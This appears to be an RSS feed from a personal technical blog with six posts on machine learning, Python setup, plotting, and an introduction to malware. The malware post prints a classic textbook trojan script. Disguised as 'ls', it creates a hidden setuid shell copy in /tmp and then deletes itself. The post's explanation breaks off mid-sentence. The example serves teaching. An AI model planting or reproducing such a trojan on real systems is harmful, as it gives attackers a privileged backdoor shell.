<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>~/personal/web/logs</title>
    <description>Personal website, blogs and other updates</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/sitemap.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 13 Jan 2020 23:18:22 +0530</pubDate>
    <lastBuildDate>Mon, 13 Jan 2020 23:18:22 +0530</lastBuildDate>
    <generator>Jekyll v3.8.5</generator>
    
      <item>
        <title>Gentle introduction to Malicious Software or Malware</title>
        <description>&lt;h3 id=&quot;definition&quot;&gt;Definition&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Malicious logic, more commonly called malware, is a set of instructions that cause a site’s security policy to be violated.&lt;sup id=&quot;fnref:fn1&quot;&gt;&lt;a href=&quot;#fn:fn1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In earlier days, when UNIX systems were popular, the hackers found a new way to get access to victims machine with a little piece of malicious code like the one below&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /bin/sh &lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# make a privileged, hidden copy of the shell (command interpreter) &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/sh /tmp/.xxsh 
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;o+s, w+x /tmp/.xxsh

&lt;span class=&quot;c&quot;&gt;# do what the victim thinks is *all* you’re doing &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$*&lt;/span&gt; 

&lt;span class=&quot;c&quot;&gt;# delete this file &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; ./ls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When this file is saved with the file name ‘ls’ is victim’s machine,&lt;/p&gt;

&lt;h3 id=&quot;references&quot;&gt;References:&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:fn1&quot;&gt;
      &lt;p&gt;Computer Security - Arts and Science, &lt;em&gt;Matt Bishop&lt;/em&gt; (Ch23 of 2nd Edition) &lt;a href=&quot;#fnref:fn1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 09 Jan 2020 00:00:00 +0530</pubDate>
        <link>http://localhost:4000/security/2020/01/09/malware-intro.html</link>
        <guid isPermaLink="true">http://localhost:4000/security/2020/01/09/malware-intro.html</guid>
        
        
        <category>security</category>
        
      </item>
    
      <item>
        <title>Introduction to dynamic realtime plotting with Plotly/Dash</title>
        <description>&lt;p&gt;–DRAFT POST–&lt;/p&gt;

&lt;h3 id=&quot;oblutrack&quot;&gt;ObluTrack&lt;/h3&gt;

&lt;p&gt;Code for this project can be found &lt;a href=&quot;https://github.com/rahulrajpl/oblutrack&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;present-stage&quot;&gt;Present Stage:&lt;/h3&gt;
&lt;p&gt;Dynamic realtime plotting of randomly generated x,y data to a web based GUI using plotly/dash&lt;/p&gt;

&lt;h3 id=&quot;next-target&quot;&gt;Next Target:&lt;/h3&gt;
&lt;p&gt;Access the sensor data from OBLU Device and plot it dynamically to get the real time trail&lt;/p&gt;

&lt;h3 id=&quot;sneakpeak&quot;&gt;SneakPeak:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/fYBi803HsDsibgRJpc/giphy.gif&quot; alt=&quot;link&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This post is being updated…&lt;/p&gt;

&lt;h3 id=&quot;thanks&quot;&gt;Thanks:&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[1] https://community.plot.ly
[2] https://pythonprogramming.net/live-graphs-data-visualization-application-dash-python-tutorial/ (via @Sentdex )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Mon, 06 Jan 2020 00:00:00 +0530</pubDate>
        <link>http://localhost:4000/python/dataviz/2020/01/06/dash-intro.html</link>
        <guid isPermaLink="true">http://localhost:4000/python/dataviz/2020/01/06/dash-intro.html</guid>
        
        
        <category>python</category>
        
        <category>DataViz</category>
        
      </item>
    
      <item>
        <title>Image Style Transfer using Convolutional Neural Network</title>
        <description>&lt;h3 id=&quot;original-paper&quot;&gt;&lt;em&gt;Original paper&lt;/em&gt;&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/Gatys_Image_Style_Transfer_CVPR_2016_paper.pdf&quot;&gt;Image style transfer using Convolutional Neural Network&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;code&quot;&gt;&lt;em&gt;Code&lt;/em&gt;&lt;/h3&gt;

&lt;p&gt;Implementation using pytorch - &lt;a href=&quot;https://colab.research.google.com/drive/10lvm78PdFyjkFixoMYD6DgH-Hpgt3Ja7&quot;&gt;link&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;learning&quot;&gt;&lt;em&gt;Learning&lt;/em&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Transfer Learning&lt;/li&gt;
  &lt;li&gt;Pretrained models (AlexNet, VGG16, VGG19)&lt;/li&gt;
  &lt;li&gt;video generation using cv2 library&lt;/li&gt;
  &lt;li&gt;Speeding up the training using CUDA/ GPU&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;credits&quot;&gt;&lt;em&gt;Credits&lt;/em&gt;:&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PyTorch for Deep Learning and Computer Vision

Rayan Slim, Jad Slim, Amer Sharaf, Sarmad Tanveer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Fri, 03 Jan 2020 00:00:00 +0530</pubDate>
        <link>http://localhost:4000/python/ml/2020/01/03/StyleTransfer.html</link>
        <guid isPermaLink="true">http://localhost:4000/python/ml/2020/01/03/StyleTransfer.html</guid>
        
        
        <category>python</category>
        
        <category>ML</category>
        
      </item>
    
      <item>
        <title>Convolutional Neural Network using PyTorch</title>
        <description>&lt;p&gt;Convolutional Neural Network using PyTorch.&lt;/p&gt;

&lt;p&gt;Notebook can be accessed here: &lt;a href=&quot;https://colab.research.google.com/drive/1BUUQvPNBbjJNiXeMWNDquxZRYZsGSjEU&quot;&gt;link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Credits:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PyTorch for Deep Learning and Computer Vision

Rayan Slim, Jad Slim, Amer Sharaf, Sarmad Tanveer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Wed, 25 Dec 2019 00:00:00 +0530</pubDate>
        <link>http://localhost:4000/python/ml/2019/12/25/CNN.html</link>
        <guid isPermaLink="true">http://localhost:4000/python/ml/2019/12/25/CNN.html</guid>
        
        
        <category>python</category>
        
        <category>ML</category>
        
      </item>
    
      <item>
        <title>Install python3.6+ for local user on remote machine without root access</title>
        <description>&lt;p&gt;I have recently encountered an issue where I have access to remote server, but the python version installed on it was 3.4. My application required 3.6+ and I do not have root access to install it using apt. So here are the steps I have followed: -&lt;/p&gt;

&lt;h3 id=&quot;installing-python-36-works-with-any-version-per-say&quot;&gt;Installing Python 3.6 (works with any version per say)&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Get the official download link from python.org website(Example. https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Download the python source release and get the folder readied for installation from source.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;s&quot;&gt;$ wget https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$ tar zxfv Python-3.6.9.tgz&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$ find ~/inflated_location/Python-3.6.9/Python -type d | xargs chmod &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0755&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$ cd Python-3.6.9&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;Install from source&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;s&quot;&gt;$ ./configure --prefix=~/inflated_location/Python-3.6.9/Python&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$ make&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$ make install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;Export the path variable&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;s&quot;&gt;$ nano ~/.bashrc&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$ export PATH=~/inflated_folder/python/Python-3.6.9/:$PATH&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$ source ~/.bashrc&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now you have python3.6 installed for logged in user and can be invoked now using command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;installing-py-packages&quot;&gt;Installing py packages.&lt;/h3&gt;

&lt;p&gt;The easiest way that I have followed is&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;s&quot;&gt;$ python -m pip install &amp;lt;package-name&amp;gt; --user&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        <pubDate>Sun, 27 Oct 2019 00:00:00 +0530</pubDate>
        <link>http://localhost:4000/python/2019/10/27/Install-Python-copy.html</link>
        <guid isPermaLink="true">http://localhost:4000/python/2019/10/27/Install-Python-copy.html</guid>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>Python packages I keep a watch on</title>
        <description>&lt;p&gt;Libraries on my watch list! This is page is under construction&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Numpy&lt;/li&gt;
  &lt;li&gt;Pandas&lt;/li&gt;
  &lt;li&gt;tensorflow&lt;/li&gt;
  &lt;li&gt;keras&lt;/li&gt;
  &lt;li&gt;sklearn&lt;/li&gt;
  &lt;li&gt;scipy&lt;/li&gt;
  &lt;li&gt;matplotlib&lt;/li&gt;
  &lt;li&gt;plotly_express &lt;a href=&quot;https://mlwhiz.com/blog/2019/05/05/plotly_express/?utm_campaign=pythons-one-liner-graph-creation-library-with-animations-hans-rosling-style&amp;amp;utm_medium=social_link&amp;amp;utm_source=missinglettr-twitter&quot;&gt;Ref&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Streamlit - For web app of ml model &lt;a href=&quot;https://streamlit.io/docs/&quot;&gt;Ref&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;snyk - For VA of packages&lt;/li&gt;
  &lt;li&gt;megaman - For scalable manifold learning &lt;a href=&quot;https://github.com/mmp2/megaman&quot;&gt;Ref&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;modin - For speeding up pandas&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All packages are being managed using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This post is not final and will be incrementally updated.&lt;/p&gt;

&lt;p&gt;Sample highligting of code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# This is a sample python code.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        <pubDate>Sat, 26 Oct 2019 00:00:00 +0530</pubDate>
        <link>http://localhost:4000/python/2019/10/26/Python.html</link>
        <guid isPermaLink="true">http://localhost:4000/python/2019/10/26/Python.html</guid>
        
        
        <category>python</category>
        
      </item>
    
  </channel>
</rss>
